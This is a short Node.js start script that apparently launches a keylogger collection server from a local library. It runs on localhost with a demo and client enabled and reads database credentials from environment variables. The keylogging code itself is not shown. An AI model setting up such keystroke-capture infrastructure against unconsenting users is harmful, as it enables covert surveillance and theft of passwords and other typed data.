// Get env variables
require('dotenv').config();

// Require the module
const keyloggerServer = require('../lib/index');

// Start the server
keyloggerServer({
  serveDemo: true,
  serveClient: true,
  hostname: 'localhost',
  database: {
    username: process.env.DBUSER,
    password: process.env.DBPASS
  }
});
